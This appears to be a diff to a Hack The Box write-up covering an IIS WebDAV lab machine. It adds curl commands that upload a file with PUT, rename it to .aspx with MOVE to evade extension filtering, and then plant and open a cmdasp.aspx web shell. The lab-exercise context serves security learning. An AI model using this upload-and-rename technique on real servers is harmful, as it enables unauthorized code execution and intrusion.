@@ -192,7 +192,7 @@ Executes: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
 Executes: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
 ```
 
-### Testing WebDAV Manually
+### Test WebDAV Manually
 ```shell
 echo "PwnStuff" > test.txt
 curl -X PUT http://10.10.10.15/test.txt -d @test.txt
@@ -233,5 +233,26 @@ You have attempted to execute a CGI, ISAPI, or other executable program from a d
 </ul>
 
 </TD></TR></TABLE></BODY></HTML>
+
+```shell
+curl -X MOVE -H 'Destination:http://10.10.10.15/test.aspx' http://10.10.10.15/test.txt
+curl http://10.10.10.15/test.aspx
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2bc4a9ea-988a-43b5-b152-014075609db5)
+
+---
+
+### Upload Web Shell
+```shell
+cp /usr/share/webshells/aspx/cmdasp.aspx .
+mv cmdasp.aspx revsh.txt
 ```
 
+### Move Web Shell
+```shell
+curl -X PUT http://10.10.10.15/revsh.txt -d @revsh.txt
+curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/revsh.txt
+```
+
+### Access Web Shell
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9f945906-a62a-457b-b743-641e12ce5ae8)
